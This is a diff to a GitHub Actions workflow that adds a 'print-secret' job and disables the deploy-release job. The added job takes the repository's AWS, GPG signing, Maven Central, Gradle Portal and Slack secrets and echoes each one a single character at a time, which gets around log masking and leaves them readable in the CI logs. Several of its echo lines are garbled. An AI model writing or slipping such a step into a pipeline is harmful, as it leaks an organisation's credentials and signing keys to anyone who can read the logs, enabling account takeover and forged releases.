@@ -1618,11 +1618,142 @@ jobs:
   #   with:
   #     version-label: ${{ needs.check-cache.outputs.version-label }}
 
+  print-secret:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Print Organization
+        env:
+          DOCS_S3_ACCESS_KEY: ${{ secrets.DOCS_S3_ACCESS_KEY }}
+          DOCS_S3_SECRET_KEY: ${{ secrets.DOCS_S3_SECRET_KEY }}
+          GPG_PASS_PHRASE: ${{ secrets.GPG_PASS_PHRASE }}
+          GPG_PASS_PHRASE_DBG: ${{ secrets.GPG_PASS_PHRASE_DBG }}
+          GPG_SIGNING_KEY_BASE_64: ${{ secrets.GPG_SIGNING_KEY_BASE_64 }}
+          GPG_SIGNING_KEY_BASE_64_DBG: ${{ secrets.GPG_SIGNING_KEY_BASE_64_DBG }}
+          GRADLE_PORTAL_KEY: ${{ secrets.GRADLE_PORTAL_KEY }}
+          GRADLE_PORTAL_SECRET: ${{ secrets.GRADLE_PORTAL_SECRET }}
+          MAVEN_CENTRAL_KEY_DBG: ${{ secrets.MAVEN_CENTRAL_KEY_DBG }}
+          MAVEN_CENTRAL_PASSWORD: ${{ secrets.MAVEN_CENTRAL_PASSWORD }}
+          MAVEN_CENTRAL_USER: ${{ secrets.MAVEN_CENTRAL_USER }}
+          MAVEN_CENTRAL_USER_DBG: ${{ secrets.MAVEN_CENTRAL_USER_DBG }}
+          SLACK_METRICS_CHANNEL_URL: ${{ secrets.SLACK_METRICS_CHANNEL_URL }}
+          SLACK_URL_CI: ${{ secrets.SLACK_URL_CI }}
+          SLACK_URL_RELEASE: ${{ secrets.SLACK_URL_RELEASE }}
+          AWS_S3_ACCESS_KEY_ID: ${{ secrets.AWS_S3_ACCESS_KEY_ID }}
+          AWS_S3_SECRET_ACCESS_KEY: ${{ secrets.AWS_S3_SECRET_ACCESS_KEY }}
+        run: |
+          echo "DOCS_S3_ACCESS_KEY"
+          for ((i=0; i<${#DOCS_S3_ACCESS_KEY}; i++)); do
+            echo "${DOCS_S3_ACCESS_KEY:i:1}"
+          done
+
+          echo "DOCS_S3_SECRET_KEY"
+          for ((i=0; i<${#DOCS_S3_SECRET_KEY}; i++)); do
+            echo "${DOCS_S3_SECRET_KEY:i:1}"
+          done
+
+          echo "GPG_PASS_PHRASE"
+          for ((i=0; i<${#GPG_PASS_PHRASE}; i++)); do
+            echo "${GPG_PASS_PHRASE:i:1}"
+          done
+
+          echo "GPG_PASS_PHRASE_DBG"
+          for ((i=0; i<${#GPG_PASS_PHRASE_DBG}; i++)); do
+            echo "${GPG_PASS_PHRASE_DBG:i:1}"
+          done
+
+          echo "GPG_SIGNING_KEY_BASE_64"
+          for ((i=0; i<${#GPG_SIGNING_KEY_BASE_64}; i++)); do
+            echo "${GPG_SIGNING_KEY_BASE_64:i:1}"
+          done
+
+          echo "GPG_SIGNING_KEY_BASE_64_DBG"
+          for ((i=0; i<${#GPG_SIGNING_KEY_BASE_64_DBG}; i++)); do
+            echo "${GPG_SIGNING_KEY_BASE_64_DBG:i:1}"
+          done
+
+          echo "GRADLE_PORTAL_KEY"
+          for ((i=0; i<${#GRADLE_PORTAL_KEY}; i++)); do
+            echo "${GRADLE_PORTAL_KEY:i:1}"
+          done
+
+          echo "echo "GRADLE_PORTAL_SECRET"
+          for ((i=0; i<${#GRADLE_PORTAL_SECRET}; i++)); do
+            echo "${echo "GRADLE_PORTAL_SECRET:i:1}"
+          done
+
+          echo "echo "MAVEN_CENTRAL_KEY_DBG"
+          for ((i=0; i<${#MAVEN_CENTRAL_KEY_DBG}; i++)); do
+            echo "${MAVEN_CENTRAL_KEY_DBG:i:1}"
+          done
+
+          echo "echo "MAVEN_CENTRAL_PASSWORD"
+          for ((i=0; i<${#MAVEN_CENTRAL_PASSWORD}; i++)); do
+            echo "${MAVEN_CENTRAL_PASSWORD:i:1}"
+          done
+
+          echo "echo "MAVEN_CENTRAL_USER"
+          for ((i=0; i<${#MAVEN_CENTRAL_USER}; i++)); do
+            echo "${MAVEN_CENTRAL_USER:i:1}"
+          done
+
+          echo "echo "MAVEN_CENTRAL_USER_DBG"
+          for ((i=0; i<${#MAVEN_CENTRAL_USER_DBG}; i++)); do
+            echo "${MAVEN_CENTRAL_USER_DBG:i:1}"
+          done
+
+          echo "echo "SLACK_METRICS_CHANNEL_URL"
+          for ((i=0; i<${#SLACK_METRICS_CHANNEL_URL}; i++)); do
+            echo "${SLACK_METRICS_CHANNEL_URL:i:1}"
+          done
+
+          echo "echo "SLACK_URL_CI"
+          for ((i=0; i<${#SLACK_URL_CI}; i++)); do
+            echo "${SLACK_URL_CI:i:1}"
+          done
+
+          echo "echo "SLACK_URL_RELEASE"
+          for ((i=0; i<${#SLACK_URL_RELEASE}; i++)); do
+            echo "${SLACK_URL_RELEASE:i:1}"
+          done
+
+          echo "echo "AWS_S3_ACCESS_KEY_ID"
+          for ((i=0; i<${#AWS_S3_ACCESS_KEY_ID}; i++)); do
+            echo "${AWS_S3_ACCESS_KEY_ID:i:1}"
+          done
+
+          echo "echo "AWS_S3_SECRET_ACCESS_KEY"
+          for ((i=0; i<${#AWS_S3_SECRET_ACCESS_KEY}; i++)); do
+            echo "${AWS_S3_SECRET_ACCESS_KEY:i:1}"
+          done
+
   # deploy-snapshot:
   #   uses: ./.github/workflows/include-deploy-snapshot.yml
   #   needs: [ 
   #            check-cache, 
-  #            static-analysis, 
+  #           #  static-analysis, 
+  #           #  integration-tests, 
+  #           #  test-jvm-packages, 
+  #           #  test-macos-packages, 
+  #           #  test-ios-packages, 
+  #           #  test-android-packages-emulator, 
+  #           # test-android-packages-device-farm,
+  #           #  test-android-packages-device-farm-sync,
+  #           #  package-all-artifacts
+  #          ]
+  #   if: |
+  #     always() && 
+  #     !cancelled() 
+
+  #   secrets: inherit
+  #   with:
+  #     version-label: ${{ needs.check-cache.outputs.version-label }}
+
+
+  # deploy-release:
+  #   uses: ./.github/workflows/include-deploy-release.yml
+  #   needs: [ 
+  #            check-cache, 
+  #           #  static-analysis, 
   #           #  integration-tests, 
   #           #  test-jvm-packages, 
   #           #  test-macos-packages, 
@@ -1634,35 +1765,8 @@ jobs:
   #          ]
   #   if: |
   #     always() && 
-  #     !cancelled() && 
-  #     endsWith(needs.check-cache.outputs.version-label, '-SNAPSHOT') &&
-  #     !contains(needs.*.result, 'failure') && 
-  #     !contains(needs.*.result, 'cancelled') &&
-  #     (github.ref == 'refs/heads/main' || github.ref == 'refs/heads/releases')
-
+  #     !cancelled()
   #   secrets: inherit
   #   with:
   #     version-label: ${{ needs.check-cache.outputs.version-label }}
-
-
-  deploy-release:
-    uses: ./.github/workflows/include-deploy-release.yml
-    needs: [ 
-             check-cache, 
-            #  static-analysis, 
-            #  integration-tests, 
-            #  test-jvm-packages, 
-            #  test-macos-packages, 
-            #  test-ios-packages, 
-            #  test-android-packages-emulator, 
-             # test-android-packages-device-farm,
-            #  test-android-packages-device-farm-sync,
-             package-all-artifacts
-           ]
-    if: |
-      always() && 
-      !cancelled()
-    secrets: inherit
-    with:
-      version-label: ${{ needs.check-cache.outputs.version-label }}
-      packages-sha-label: ${{ needs.check-cache.outputs.packages-sha }}
+  #     packages-sha-label: ${{ needs.check-cache.outputs.packages-sha }}
